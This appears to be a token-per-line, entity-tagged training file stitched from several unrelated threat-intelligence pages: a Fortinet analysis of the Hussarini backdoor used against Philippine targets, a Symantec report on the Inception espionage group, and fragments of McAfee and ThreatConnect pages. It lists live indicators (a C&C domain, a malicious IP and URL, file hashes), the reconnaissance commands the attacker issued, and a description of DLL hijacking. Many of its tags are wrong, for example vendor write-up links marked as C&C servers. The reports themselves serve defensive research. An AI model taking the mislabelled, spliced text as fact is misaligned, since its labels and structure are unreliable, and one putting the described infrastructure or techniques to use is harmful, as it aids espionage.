650b7d25f4ed87490f8467eb48e0443fb244a8c4  B_hash
65e7d2338735ec04fd9692d020298e5a7953fd8d  B_hash
166e8c643a4db0df6ffd6e3ab536b3de9edc9fb7  B_hash
a2e966edee45b30bb6bb5c978e55833eec169098  B_hash

Domains
530hr[dot]com/data/common.php B_url.normal
028xmz[dot]com/include/common.php B_url.normal
168wangpi[dot]com/include/charset.php B_url.normal

Falcancoin[dot]io

Previous
Article

Next
Article


Categories
:
McAfee
Labs

Tags
:
advanced
persistent
threats
,
cybercrime
,
cybersecurity
,
malware

Leave
a
reply

Facebook
Comments
(
1
)
Comments
(
0
)
G+
Comments
1
Comment

Sort
by

Add
a
comment
...

Facebook
Comments
Plugin

Leave
a
Comment

Comment

Name
*

Email
*

Please
enter
an
answer
in
digits
:
13
+
16
=

Post
Comment

Post
Comment

About
|
Subscribe
|
Contact
&
Media
Requests
|
Privacy
Policy
|
Legal
©
2018
McAfee
LLC

Close
Menu

Search

Business

Consumer

Executive
Perspectives

McAfee
Partners

McAfee
Labs

Languages

English

Follow
us




About

Subscribe

Contact
&
Media
Requests

Privacy
Policy

Legal
©
McAfee
LLC
THREAT
RESEARCH

Hussarini B_malware.backdoor
–
Targeted
Cyber
Attack
in
the
Philippines

By
Jasper
Manuel
and
Rommel
Joven
|
July
08
,
2018

Two
weeks
ago
,
FortiGuard
Labs
spotted
a
malicious
document
with
the
politically
themed
file
name
'
Draft
PH-US
Dialogue
on
Cyber
Security.doc
'
.

This
document
takes
advantage
of
the
vulnerability
CVE-2017-11882
.

Upon
successful
exploitation
,
it
drops
a
malware
in
the
victim's
%temp%
directory
.

Our
analysis
of
this
malware
shows
that
it
belongs
to
Hussarini  B_malware.backdoor
,
also
known
as
Sarhust
,
a
backdoor
family
that
has
been
used
actively
in
APT
attacks
targeting
countries
in
the
ASEAN
region
since
2014
.

According
to
reports
,
the
Philippines
is
the
most
exposed
country
in
ASEAN
to
the
cyberattacks
known
as
advanced
persistent
threats
,
or
APTs
.

After
several
massive
data
breaches
in
2016
,
the
Philippines
started
to
invest
in
beefing
up
their
defences
against
cyberattacks
.

In
spite
of
these
investments
,
however
,
the
Philippines
is
still
among
the
most
prone
countries
to
be
targeted
by
these
sorts
of
APT
attacks
.

Exploit
Document

Our
analysis
begins
with
the
exploit
document
named
'
Draft
PH-US
Dialogue
on
Cyber
Security.doc
'
that
takes
advantage
of
the
CVE-2017-11882
vulnerability
.

Upon
successful
exploitation
,
the
malicious
document
file
drops
two
files
in
the
%Temp%
directory
.
·
Outllib.dll
·
OutExtra.exe

OutExtra.exe
is
a
signed
legitimate
application
from
Microsoft
named
finder.exe
.

This
file
is
part
of
the
Microsoft
Office
suite
and
can
be
used
to
find
keywords
within
Outlook
data
files
.

However
,
in
this
attack
,
this
file
is
used
to
load
the
Hussarini  B_malware.backdoor
backdoor  I
via
DLL B_malware.backdoor
hijacking I
.

DLL B_malware.backdoor
hijacking I
is
a
technique
used
by
some
APT
malware
in
which
instead
of
the
legitimate
application
(
.exe
)
loading
the
benign
DLL
,
the
application
is
tricked
into
loading
a
DLL
containing
malicious
code
.

Using
this
technique
,
a
malware
can
evade
the
Host
Intrusion
Prevention
System
(
HIPS
)
of
security
programs
that
monitor
the
behaviors
of
executed
files
.

Most
HIPS
tools
whitelist
signed
or
trusted
files
,
thereby
excluding
any
malware
loaded
using
DLL B_malware.backdoor
hijacking I
by
those
signed
files
from
any
behavior
monitoring
.

In
the
context
of
this
attack
,
OutExtra.exe
is
a
signed
legitimate
application;
however
,
it
is
tricked
into
loading
a
malware
file
that
is
disguised
as
the
legitimate
Outllib.dll
file
.

Decoy
Document

To
avoid
suspicion
by
the
victim
,
the
exploit
downloads
a
decoy
document
from
the
legitimate-seeming
hxxp://157.52.167.71:29317/office/word/2003/ph2/philip.varilla  B_url.normal
.

During
our
analysis
,
though
,
the
download
link
for
the
decoy
document
was
already
down
.

However
,
taking
a
look
at
the
URI
,
we
spotted
several
clues
as
to
where
/
from
whom
the
hacker
possibly
wants
the
user
to
believe
the
document
came
from
.

First
is
the
'
ph2
,
'
which
could
mean
'
ph
'
for

Philippines
and
'
2
'
as
its
second
directory
of
decoy
documents
.

And
second
is
'
philip.varilla
'
.
A
quick

Google
search
on
this
name
led
us
to
the
Service
Director
of
the
Philippines
Department
of
Information
and
Communications
Technology
(
DICT
)
,
who
has
the
same
name
.

DICT
is
the
agency
responsible
for
the
planning
,
development
,
and
promotion
of
the
Philippines
'
information
and
communications
technology
including
cybersecurity
.

Hussarini  B_malware.backdoor

In
fact
,
the
file
Outllib.dll
is
actually
the
Hussarini  B_malware.backdoor
backdoor  I
,
a
DLL
which
exports
functions
containing
the
malicious
code
.

When
the
file
OutExtra.exe
is
executed
,
some
of
these
functions
are
called
,
effectively
executing
its
malicious
code
.

Fig
1
.
Hussarini  B_malware.backdoor
export
functions

While
the
original
Outllib.dll
also
has
some
of
the
functions
above
,
notice
that
this
backdoor
has
a
lot
more
exported
functions
than
just
the
backdoor
DLL
.

Fig
2
.
Export
functions
of
the
original
Outllib.dll
file

There
is
also
a
big
difference
in
the
file
size
.

The
original
Outllib.dll
has
a
file
size
range
of
4-8
MB
,
depending
on
the
version
,
but
the
fake
file
only
ranges
from
40-50
KB
.

One
of
the
reasons
for
this
big
difference
in
file
size
is
that
only
one
of
the
exported
functions
of
the
backdoor
DLL
contains
the
malicious
code
.

All
of
the
others
are
just
RETN
functions
that
do
nothing
.

Thus
,
we
will
focus
our
analysis
on
the
function
that
contains
the
backdoor
code
named
RenInitInstance@12  B_malware.backdoor
.

This
function
begins
by
instantiating
a
class
initializing
the
setting
of
the
bot
.

It
then
creates
two
concurrent
threads
taking
the
created
object
as
its
parameter
.

Fig
3
.
Hussarini  B_malware.backdoor
main
function

The
first
thread
acts
as
a
client
thread
that
is
responsible
for
communicating
with
the
command
and
control
(
C&C
)
server
and
listening
for
commands
.

The
response
is
then
parsed
and
passed
to
the
second
thread
that
acts
as
the
worker
.

The
worker
thread
executes
the
commands
and
reports
the
result
to
the
client
thread
.

Before
communicating
with
its
command
and
control
(
C&C
)
,
the
malware
saves
a
ServerID
in
the
registry
with
a
randomly
generated
value
.

This
ID
identifies
this
bot
in
the
botnet
.

Fig
4
.
Bot
ServerID

C&C
Communication

Interestingly
,
there's
a
private
IP
address
10.1.0.105  B_ip.normal
in
the
code
that
may
have
been
used
as
a
test
C&C
server
.

This
IP
address
is
replaced
at
runtime
with
the
real
C&C
publicdfaph.publicvm.com  B_url.cncsvr
.

When
communicating
with
its
C&C
,
Hussarini  B_malware.backdoor
uses
its
own
custom
protocol
encoded
with
base64
,
which
is
sent
over
HTTP
.

Due
to
the
high-level
nature
of
the
code
and
limited
analysis
time
,
we
were
not
able
to
identify
all
the
fields
of
the
protocol
,
but
knowing
some
important
parts
is
enough
to
understand
how
the
communication
works
.

Fig
5
.
Hussarini  B_malware.backdoor
protocol

The
initial
data
it
sends
contains
the
generated
ServerID
,
the
size
,
and
the
checksum
of
the
message
.

This
data
is
encoded
with
base64
and
sent
as
an
argument
to
the
HTTP
GET
request
.

Fig
6
.
Initial
message
to
the
command
and
control
server

The
response
from
the
C&C
is
enclosed
with
the
tag
<CHECK></CHECK>
.

The
data
in
between
is
also
base64
encoded
.

When
decoded
,
we
can
see
that
it
follows
the
same
data
structure
as
the
initial
message
.

Fig
7
.
Initial
response
from
the
command
and
control
server

After
the
check
,
the
malware
gets
the
following
system
information
,
which
it
sends
to
the
C&C
via
an
HTTP
POST
request
:
·

User
name
,
Computer
Name
,
OS
,
and
CPU
information

Fig
8
.
Sending
of
machine
information
to
the
C&C

It
took
a
while
before
we
were
able
to
receive
commands
from
the
C&C
,
and
when
we
did
we
suddenly
lost
connection
to
the
C&C
,
which
could
mean
that
the
hacker
controls
the
C&C
manually
.

The
connection
disruption
could
be
because
the
attacker
detected
that
the
bot
was
being
analysed
and
blocked
our
analysis
environment
from
communicating
with
the
C&C
,
or
just
that
the
machine
is
not
interesting
to
performing
further
attacks
.

The
received
data
was
enclosed
with
the
tag
<COMMAND></COMMAND>
,
encoded
with
base64
,
and
still
follows
the
same
data
structure
of
the
protocol
when
decoded
.

The
commands
are
pretty
obvious
since
its
strings
are
not
encrypted
after
decoding
the
data
.

Fig
9
.
Receiving
commands
from
the
C&C

The
first
command
includes
the
string
'
cache.txt
'
.
The
worker
thread
is
called
with
this
command
to
create
the
following
files
in
the
same
directory
where
the
malware
is
running
.

·
cache.txt
·
cache.txt.cfg

The
second
command
contains
commands
for
the
Command
Prompt
(
cmd.exe
)
.

Fig
10
.
Receiving
next
commands
from
the
C&C

The
following
cmd
commands
sent
from
the
C&C
are
then
passed
to
the
worker
thread
and
written
to
cache.txt
.

Fig
11
.
Commands
written
in
cache.txt

The
description
of
the
commands
written
on
cache.txt
are
as
follows
:
·
systeminfo
–
get
the
systeminfo
of
the
computer
·
arp
–a
–
view
the
mapping
of
IP
addresses
to
MAC
addresses
·
ipconfig
/all
–
display
all
current
TCP/IP
network
configuration
values
·
netstat
-ano
-
displays
protocols
statistics
and
current
TCP/IP
network
connections
·
tasklist
-v
–
list
of
apps
and
services
with
their
Process
ID
(
PID
)
for
all
task
running
·
net
start
–
starts
any
of
the
various
services
that
are
running
·
net
view
–
displays
the
other
computers
that
are
visible
on
the
network
·
dir
'
c:\users
'
/o-d
–
displays
all
users

After
sending
these
cmd
commands
,
the
C&C
stopped
responding
.

It
could
be
that
the
hacker
decided
to
block
the
connection
after
seeing
the
result
of
these
commands
.

Based
on
its
code
,
this
malware
is
capable
of
executing
the
following
commands
from
the
hacker
:
·
Create
,
read
,
write
files
·
Download
and
execute
files
/
components
·
Launch
remote
shell
using
cmd.exe

While
other
APT
backdoors
have
more
capabilities
,
such
as
keylogging
,
taking
screen
shots
,
etc
.
,

Hussarini  B_malware.backdoor
only
has
few
,
including
the
capability
to
download
and
execute
files
/
components
.

However
,
its
functionality
can
be
extended
by
the
hacker
.

Also
,
since
this
backdoor
can
launch
a
remote
cmd
shell
,
all
cmd
commands
are
available
for
the
attacker
to
use
,
such
as
those
seen
in
Figure
11
.

Hussarini  B_malware.backdoor
uses
a
dynamic
domain
to
maintain
anonymity
and
to
also
possibly
be
able
to
change
the
C&C
server
IP
address
.

At
the
time
of
this
analysis
,
however
,
we
only
saw
it
resolved
to
the
IP
address
157.52.167.71 B_ip.normal
,
which
is
the
same
IP
used
to
host
the
decoy
document
.

Fig
12
.
C&C
domain
name
resolution

Final
thoughts

We
are
unsure
how
the
document
is
being
distributed
;
however
,
taking
a
look
at
the
C&C
domain
name
publicdfaph.publicvm.com  B_url.cncsvr
and
considering
the
file
name
of
the
exploit
document
'
Draft
PH-US
Dialogue
on
Cyber
Security.doc
'
and
the
clues
from
the
decoy
document
download
link
hxxp://157.52.167.71:29317/office/word/2003/ph2/philip.varilla  B_url.distribute
,
there
is
one
scenario
that
seems
to
make
the
most
sense
.

It
seems
likely
that
the
names
used
were
crafted
to
make
it
look
like
the
document
came
from
the
Department
of
Information
and
Communications
Technology
(
DICT
)
,
or
possibly
from
the
Service
Director
,
which
would
imply
that
the
employees
of
the
Department
of
Foreign
Affairs
(
DFA
)
are
the
target
.

Clearly
,
the
use
of
publicdfaph
in
the
C&C
domain
name
is
used
to
camouflage
the
traffic
and
to
trick
a
network
administrator
into
thinking
that
this
domain
is
under
DFA
so
as
not
to
raise
any
suspicion
.

Conclusion

Hussarini  B_malware.backdoor
was
first
mentioned
in
APT
campaigns
targeting
the
Philippines
and
Thailand
in
2014
.

Today
,
this
malware
is
still
actively
being
used
against
the
Philippines
.

The
Department
of
Information
and
Communications
Technology
was
only
formed
in
2016
and
has
acknowledged
that
the
Philippines
'
state
of
cybersecurity
is
still
in
infancy
.

In
general
,
this
contributes
to
the
Philippines
continuing
to
be
a
target
for
cybercrim
/
cyberespionage
or
even
state-sponsored
attacks
.

Because
of
this
,
we
expect
that
attacks
targeting
that
region
will
continue
to
evolve
in
both
quantity
and
quality
.

As
always
,
we
here
at
FortiGuard
Labs
will
continue
to
monitor
events
in
order
to
hunt
for
,
catch
,
and
block
these
attacks
.

Solution
:

Fortinet
detects
the
exploit
document
as
MSOffice/CVE_2017_11882.A!tr
and
the
Hussarini  B_malware.backdoor
samples
as
W32/Sarhust.D!tr
.

Malicious
URLs
related
to
this
malware
are
also
blocked
by
FortiGuard
Web
Filtering
Service
.

-=
FortiGuard
Lion
Team
=-

IOCs
:

SHA256
:
154261a4aab73f1ceef28695d8837902cc1e8b5cca0b8fc81ddeda350564adc0  B_hash
-

MSOffice/CVE_2017_11882.A!tr
05dcc7856661244d082daa88a074d2f266c70623789a7bb5a919282b178d8f98  B_hash
-
W32/Sarhust.D!tr
hxxp://157.52.167.71:29317/office/word/2003/ph2/philip.varilla  B_url.distribute
hxxp://publicdfaph.publicvm.com:8080/ B_url.cncsvr

Check
out
our
latest
Quarterly
Threat
Landscape
Report
for
more
details
about
recent
threats
.

Sign
up
for
our
weekly
FortiGuard
Threat
Brief
or
for
our
FortiGuard
Threat
Intelligence
Service
.

Tags
:
apt
,
APT
Campaign

Related
Posts

THREAT
RESEARCH

Rehashed
RAT
Used
in
APT
Campaign
Against
Vietnamese
Organizations

THREAT
RESEARCH

A
Deep
Dive
Analysis
of
the
FALLCHILL
Remote
Administration
Tool

THREAT
RESEARCH

New
Ransomworm
Follows
WannaCry
Exploits

Join
the
Discussion

Comments
for
this
thread
are
now
closed
.
0
Comments

FortinetBlog

Recommend

Share⤤

Login1

Sort
by
Best

Subscribe

Add
Disqus
to
your
siteAdd
DisqusAdd

Disqus
'
Privacy
PolicyPrivacy

News
&
Articles

News
Releases

News
Articles

Trademarks
×This
discussion
has
been
closed
.
Security
Research

Threat
Research

FortiGuard
Labs

Threat
Map

Threat
Briefs

Ransomware

Connect
With
Us

Blog

Fuse

Company

About
Us

Why
Fortinet

Security
Fabric

Exec
Mgmt

Careers

Certifications

Events

Industry
Awards

Contact
Us
(
866
)
868-3678

Copyright
©
2018
Fortinet
,
Inc
.
All
Rights
Reserved
Terms
of
Services
Privacy
Policy
Blogs

POSTED
:
14
MAR
,
2018
6
MIN
READ

THREAT
INTELLIGENCE
(
/BLOGS/THREAT-INTELLIGENCE
)

Inception B_malware.backdoor
Framework I
:
Alive
and
Well
,
and
Hiding
Behind
Proxies

Espionage
group
has
remained
active
over
the
past
three
years
,
using
cloud
and
IoT
to
hide
in
plain
sight
.

The
cyber
espionage
group
known
as
the
Inception B_malware.backdoor
Framework I
has
significantly
developed
its
operations
over
the
past
three
years
,
rolling
out
stealthy
new
tools
and
cleverly
leveraging
the
cloud
and
the
Internet
of
Things
(
IoT
)
in
order
to
make
its
activities
harder
to
detect
.

Since
2014
,
Symantec
has
found
evidence
of
a
steady
stream
of
attacks
from
the
Inception B_malware.backdoor
Framework I
targeted
at
organizations
on
several
continents
.

As
time
has
gone
by
,
the
group
has
become
ever
more
secretive
,
hiding
behind
an
increasingly
complex
framework
of
proxies
and
cloud
services
.

History
of
stealthy
attacks

The
Inception B_malware.backdoor
Framework I
has
been
active
since
at
least
May
2014
and
its
activities
were
first
exposed
by
Blue
Coat
(
now
part
of
Symantec
)
in
December
2014
(
https://www.symantec.com/connect/blogs/blue-coat-exposes-Inception B_malware.backdoor-framework-very-sophisticated-layered-malware-attack-targeted-milit B_url.normal
)
.

Right
from
the
start
,
the
group
stood
out
because
of
its
use
of
an
advanced
,
highly
automated
framework
to
support
its
targeted
attacks
.

This
level
of
sophistication
is
rarely
seen
,
even
in
the
targeted
attacks
sphere
.

The
nature
of
Inception's B_malware.backdoor
targets
,
from
2014
right
through
to
today
,
along
with
the
capabilities
of
its
tools
,
indicate
that
espionage
is
the
primary
motive
of
this
groups
.

In
2014
,
Inception B_malware.backdoor
was
compromising
targeted
organizations
using
spear B_malware.backdoor
- I
phishing  I
emails
,
which
masqueraded
as
legitimate
emails
concerning
international
policy
,
upcoming
conferences
,
and
specific
sectoral
interests
of
the
targeted
organization
.

More
than
half
of
the
group's
earlier
targets
were
in
the
Energy
or
Defense
sectors
,
but
it
also
targeted
organizations
in
the
Consultancy
/
Security
,
Aerospace
,
Research
,
and
Media
sectors
,
in
addition
to
embassies
.

Its
activities
ranged
across
the
globe
,
with
targets
located
in
South
Africa
,
Kenya
,
the
United
Kingdom
,
Malaysia
,
Suriname
,
along
with
several
other
European
and
Middle
Eastern
countries
.

Word
documents
attached
to
Inception's B_malware.backdoor
spear B_malware.backdoor
- I
phishing  I
emails
leveraged
two
Microsoft
Office
vulnerabilities
(
CVE-2014-1761
(
https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1761  B_url.distribute
)
and
CVE-2012-0158
(
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve2012-0158  B_url.distribute
)
)
to
install
malware
on
the
recipient's
computer
.

The
malware
had
a
multi-staged
structure
that
began
with
a
malicious
RTF
document
and
ended
with
an
in-memory
DLL
payload
that
communicated
,
via
the
WebDAV
protocol
,
with
a
command
and
control
(
C&C
)
address
from
a
legitimate
cloud
service
provider
(
CloudMe.com
)
.

The
name
'
Inception B_malware.backdoor
'
comes
from
the
group's
many
levels
of
obfuscation
and
indirection
it
employed
in
delivering
this
payload
.

Further
layers
of
obfuscation
emerged
when
Blue
Coat
was
able
to
determine
that
the
attackers
were
communicating
with
CloudMe.com
through
a
hacked
network
of
compromised
routers
,
the
majority
of
which
were
located
in
South
Korea
.

Stepping
out
of
the
shadows
once
again

Following
its
exposure
in
late
2014
,
Inception B_malware.backdoor
fell
quiet
.
However
,
this
turned
out
to
be
only
a
brief
hiatus
and
,
by
April
2015
,
there
had
been
a
resurgence
in
activity
.

Attacks
have
continued
since
then
,
right
through
to
2017
.

Figure
1
.
Inception B_malware.backdoor
Framework I
attacks
2015-2017
.

In
the
intervening
years
,
the
Inception B_malware.backdoor
Framework I
has
evolved
,
adding
additional
layers
of
obfuscation
in
a
bid
to
avoid
detection
.

The
group
is
using
new
types
of
lure
documents
in
its
spear B_malware.backdoor
- I
phishing  I
campaigns
and
its
malware
has
expanded
to
use
new
types
of
plugins
.

Inception B_malware.backdoor
has
also
increased
its
use
of
the
cloud
,
and
diversified
the
range
of
cloud
providers
it
uses
for
C&C
purposes
.

Figure
2
.
Locations
of
organizations
targeted
by
Inception B_malware.backdoor
,
2015-2017
.

The
locations
of
Inception's B_malware.backdoor
targets
have
shifted
since
2014
,
but
the
group
continues
to
have
a
global
reach
.

Russia
accounted
for
the
largest
number
of
attacks
between
2015
and
2017
,
followed
by
Ukraine
,
Moldova
,
Belgium
,
Iran
,
and
France
.

An
evolved
attack
framework

Since
2014
,
the
Inception B_malware.backdoor
Framework I
has
steadily
changed
its
tools
and
techniques
.

In
its
early
attacks
,
the
group's
malware
payload
(
with
the
exception
of
plugins
)
was
fully
contained
within
an
exploit
document
emailed
to
the
victim
.

In
more
recent
activity
,
these
spear B_malware.backdoor
- I
phishing  I
attacks
are
now
a
twostage
process
.

The
group
will
 rst
email
the
target
a
malicious
'
Reconnaissance
document
'
which
,
if
opened
,
will
fingerprint
the
target
computer
(
https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899/  B_url.distribute
)
,
gathering
information
on
what
software
it
is
running
and
whether
that
software
is
up
to
date
.

Several
days
later
,
Inception B_malware.backdoor
will
send
a
second
spear B_malware.backdoor
- I
phishing  I
email
to
the
target
,
with
another
malicious
document
attached
.

This
document
is
designed
to
retrieve
a
remote
RTF
file
,
which
contains
the
exploit
,
and
open
it
on
the
target's
computer
.

Shortly
after
this
RTF
document
is
opened
,
the
remaining
stages
of
the
Inception B_malware.backdoor
malware I
are
found
executing
on
the
system
.

The
loader
DLL
is
responsible
for
decrypting
and
injecting
the
core
payload
DLL
into
memory
,
from
an
encrypted
file
present
on
disk
.

The
core
payload
DLL's
main
function
is
to
gather
system
information
,
execute
other
malware
in
the
form
of
plugins
,
and
update
itself
.

It
accesses
C&C
via
WebDAV
hosted
on
legitimate
cloud
storage
providers
.

The
use
of
an
initial
reconnaissance
document
allows
Inception B_malware.backdoor
to
profile
the
target's
computer
and
potentially
customize
any
subsequent
malicious
document
to
exploit
known
vulnerabilities
in
unpatched
software
on
the
computer
.

By
breaking
its
attacks
up
into
distinct
stages
,
Inception B_malware.backdoor
also
makes
them
harder
to
detect
.

For
investigators
to
trace
an
attack
,
each
stage
will
have
be
uncovered
and
referenced
to
the
other
stages
.

Modular
malware

Inception's B_malware.backdoor
malware
is
modular
and
the
attackers
will
load
plugins
based
on
requirements
for
each
attack
.

The
group
has
used
a
range
of
plugins
in
recent
attacks
,
some
of
which
are
improved
versions
of
plugins
used
in
2014
,
while
others
were
previously
unseen
.

File
hunting
plugin
:
The
most
frequently
used
plugin
,
similar
to
one
used
in
2014
.

Often
used
to
collect
Office
files
from
temporary
internet
history
.

Detailed
survey
plugin
:
Used
to
gather
domain
membership
,
processes
/
loaded
modules
,
hardware
enumeration
,
installed
products
,
logical
and
mapped
drive
information
.
Evolution
of
earlier
plugin
used
in
2014
.

Browser
plugin
:
Used
to
steal
browser
history
,
stored
passwords
and
sessions
.

Works
with
Internet
Explorer
,
Chrome
,
Opera
,
Firefox
,
Torch
,
and

Yandex
.

File
listing
plugin
:
Works
on
local
or
remote
drives
and
can
map
additional
paths
when
given
credentials
.

Expanding
use
of
the
cloud

Since
2014
,
Inception B_malware.backdoor
has
widened
its
use
of
cloud
service
providers
for
C&C
purposes
.

Whereas
previously
it
relied
on
one
service
provider
(
CloudMe.com
)
,
more
recently
it
has
employed
a
least
five
cloud
service
providers
.

Leveraging
the
cloud
for
C&C
has
a
number
of
advantages
for
groups
like
Inception B_malware.backdoor
.

Any
C&C
communications
will
involve
encrypted
traffic
to
a
known
website
,
meaning
it
is
less
likely
to
raise
flags
on
targeted
networks
.

Legitimate
cloud
services
are
not
likely
to
be
blacklisted
.

Varying
the
cloud
service
provider
used
adds
a
further
degree
of
stealth
.

Once
it
became
known
Inception B_malware.backdoor
was
using
a
single
provider
,
any
traffic
to
that
provider
may
have
attracted
additional
scrutiny
.

Symantec
has
notified
all
cloud
providers
affected
.

Where
possible
Symantec
has
provided
details
on
the
C&C
accounts
used
by
Inception B_malware.backdoor
to
the
affected
cloud
providers
.

The
accounts
in
questions
have
been
deleted
or
disabled
.

Using
IoT
to
hide
behind
proxies

Inception B_malware.backdoor
is
continuing
to
use
chains
of
infected
routers
to
act
as
proxies
and
mask
communications
between
the
attackers
and
the
cloud
service
providers
they
use
.

Certain
router
manufacturers
have
UPnP
listening
on
WAN
as
a
default
configuration
.

Akamai
research
has
found
that
there
are
765,000
devices
vulnerable
to
this
attack
.

These
routers
are
hijacked
by
Inception B_malware.backdoor
and
configured
to
forward
traffic
from
one
port
to
another
host
on
the
internet
.

Abuse
of
this
service
requires
no
custom
malware
to
be
injected
on
the
routers
and
can
be
used
at
scale
very
easily
.

Inception B_malware.backdoor
strings
chains
of
these
routers
together
to
create
multiple
proxies
to
hide
behind
.

'
#InceptionFramework B_malware.backdoor
evolved
,
rolling
out
new
tools
&
hiding
behind
increasingly
complex
array
of
proxies
&
cloud
services
symc.ly/2GsqXra
'

CLICK
TO
TWEET
(
//TWITTER.COM/INTENT/TWEET
?

TEXT=%23InceptionFRAMEWORK%20EVOLVED,%20ROLLING%20OUT%20NEW%20TOOLS%20%26%20HIDING%20BEHIND%20INCREASINGLY%2 B_malware.backdoor

Every
connection
builds
different
chains
of
infected
routers
and
once
the
connection
is
complete
,
it
cleans
up
after
itself
.

In
several
cases
,
Symantec
has
been
able
to
follow
the
entire
chain
of
compromised
routers
and
found
it
led
to
a
virtual
private
server
(
VPS
)
,
meaning
the
attackers
have
employed
an
additional
layer
of
security
by
routing
communications
through
rented
hosting
servers
.

Mobile
devices
targeted

Inception B_malware.backdoor
has
an
ongoing
interest
in
mobile
devices
and
has
previously
developed
malware
to
infect
Android
(
Android.Lastacloud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99  B_url.distribute
)
)
,
iOS
(
IOS.Lastaccoud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99  B_url.distribute
)
)
and
BlackBerry
devices
(
BBOS.Lastacloud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99  B_url.distribute
)
)
.

Mobile
malware
continues
to
be
deployed
and
the
group
has
made
some
modifications
to
its
Android
malware
.

The
malware
is
spread
via
SMS
messages
and
emails
containing
malicious
links
.

Once
installed
,
it
uses
user
profile
pages
on
online
forums
as
dead
drops
for
its
C&C
.

Figure
3
.
Malicious
SMS
message
used
by
Inception B_malware.backdoor
to
spread
Android
malware

Persistence
,
stealth
,
and
global
reach

Even
prior
to
its
discovery
in
2014
,
Inception B_malware.backdoor
went
to
great
lengths
both
to
avoid
detection
and
conceal
its
location
.

Exposure
hasn't
deterred
the
group
.

Instead
,
it
has
redoubled
its
efforts
,
adding
more
layers
of
obfuscation
to
an
already
complex
attack
framework
.

Its
persistence
,
stealth
,
and
global
reach
mean
the
group
continues
to
pose
an
ongoing
risk
to
organizations
,
particularly
in
its
areas
of
interest
,
which
include
defense
,
aerospace
,
energy
,
governments
,
telecoms
,
media
,
and
finance
.

Aside
from
a
suite
of
advanced
modular
malware
,
the
group
is
notable
for
its
ability
to
make
use
of
new
platforms
such
as
the
cloud
,
IoT
,
and
mobile
to
facilitate
its
attacks
.

An
'
early
adopter
'
,
Inception's B_malware.backdoor
tactics
may
point
the
way
towards
how
other
espionage
groups
may
modify
their
methods
in
years
to
come
.

Protection

Symantec
has
had
protection
for
all
of
the
Inception B_malware.backdoor
Framework I
tools
since
the
initial
emergence
of
the
group
in
2014
.

The
following
detections
are
in
place
today
:

File-based
protection

Infostealer.Rodagose
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-120814-2005-99  B_url.cncsvr
)

Trojan.Rodagose!g1
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121010-5835-99  B_url.cncsvr
)

Trojan.Rodagose!g2
(
https://www.symantec.com/security_response/writeup.jsp?docid=2017-102416-2407-99  B_url.cncsvr
)

Trojan.MDropper
(
https://www.symantec.com/security_response/writeup.jsp?docid=2005-031911-0600-99  B_url.cncsvr
)

Mobile

Android.Lastacloud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99  B_url.cncsvr
)

BBOS.Lastacloud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99  B_url.cncsvr
)

IOS.Lastacloud
(
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99  B_url.cncsvr
)

Network
Protection
Products

Malware
Analysis
Appliance
detects
activity
associated
with
Inception B_malware.backdoor
.

Customers
with
Webpulse-enabled
products
are
protected
against
activity
associated
with
Inception B_malware.backdoor
.

Security
Response
Attack
Investigation
Team

The
Attack
Investigation
Team
is
a
group
of
security
experts
within
Symantec
Security
Response
whose
mission
is
to
investigate
targeted
attacks
,
drive
enhanced
protection
in
Symantec
products
,
and
offer
analysis
which
helps
customers
respond
to
attacks
.

About
the
Author

About
the
Author

Network
Protection
Security
Labs

Network
Protection
Security
Labs
is
a
group
of
security
experts
within
Network
Protection
Products
doing
advanced
security
research
to
continuously
improve
Symantec
Network
Products
.
Threat
Connect

Threat
Intelligence

Platform

Why
Threat
Intelligence
is
Important

How
to
Develop
Threat
Intelligence

Community
Collaboration
Case
Study

Capabilities

Integrations

ThreatConnectTM
API

ThreatConnectTM
Cloud

Cloud
Security

Upgrade

Communities

Private
Communities

Moderated
Common
Community

Moderated
Subscriber
Communities

Intelligence
Research
Team

Data
Privacy

Diamond
Model
of
Intrusion
Analysis

Threat
Inference
Engine

Collaborative
Intelligence

In
The
News

Press
Releases

Blog

Leadership

Careers

Contact
Us

News
&
Events

Methodology

About

Login

Home

News

News

Where
There
is
Smoke
,
There
is
Fire
:
South
Asian
Cyber
Espionage
Heats

Posted
August
2
,
2013
by
TCIRT
&
filed
under
Research
.

Summary
:

The
global
proliferation
of
cyber
espionage
may
be
serving
as
a
catalyst
for
regional
entities
within
South
Asia
to
adopt
their
own
cyber
espionage
capabilities
.

Irrespective
of
the
threats
sophistication
or
motivation
,
South
Asian
cyber
threats
are
likely
emulating
behaviors
of
larger
regional
powers
to
strategically
influence
national
,
organizational
or
individual
objectives
.

The
ThreatConnect
Intelligence
Research
Team
(
TCIRT
)
has
identified
an
example
of
South
Asian
cyber
espionage
that
is
likely
transcending
sectors
and
regional
geographic
boundaries
.

Analyses
of
multiple
customized
malware
binaries
hosted
within
a
small
U.S.
subnet
have
likely
been
used
to
target
Indian
military
or
government
entities
.

The
malware
contains
specific
artifacts
that
point
to
a
commercial
Pakistani
entity
.

Although
the
TCIRT
cannot
conclusively
confirm
direct
involvement
,
several
hypotheses
have
been
developed
which
may
account
for
the
malware
and
observed
activity
.

All
of
the
following
information
and
threat
indicators
are
available
within
ThreatConnect.com B_url.normal
and
have
been
shared
with
the
ThreatConnect
community
.

Operational
Caveat
:
The
ThreatConnect
Intelligence
Research
Team
has
contacted
the
affected
service
providers
and
notified
them
of
the
activity
observed
.

Details
associated
with
this
threat
have
been
shared
with
the
ThreatConnect
Community
within
Incident
'
20130731A
:
South
Asia
Cyber

Espionage
Heats
Up
'
.

It
Takes
Two
to
Tango
:

Globalization
has
woven
the
Internet
into
a
fabric
that
interlaces
practically
every
aspect
of
modern
living
.

Throughout
the
years
,
as
evidenced
in
countless
media
reports
,
world
superpowers
have
recognized
and
utilized
the
Internet
as
a
powerful
source
for
intelligence
collection
,
and
on
occasion
we
have
been
offered
glimpses
as
to
how
they
are
leveraging
cyber
espionage
in
support
of
their
national
diplomatic
,
military
or
economic
objectives
.

Similar
to
a
younger
sibling
looking
up
to
a
big
brother
,
